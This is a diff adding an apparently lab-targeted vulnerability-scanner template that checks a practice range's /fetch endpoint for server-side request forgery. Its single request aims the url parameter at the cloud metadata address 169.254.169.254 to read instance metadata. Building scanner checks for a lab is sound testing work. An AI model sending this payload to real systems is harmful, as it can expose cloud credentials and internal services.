@@ -1,0 +1,22 @@
+id: sentinel-lab-ssrf-internal
+
+info:
+  name: Sentinel Lab SSRF (内网可达)
+  author: sentinel
+  severity: critical
+  description: 靶场 /fetch 的 url 参数可探测内网并读取云元数据
+  tags: ssrf,lab
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "sentinel-ssrf-ok"
+          - "AKIA-SENTINEL"
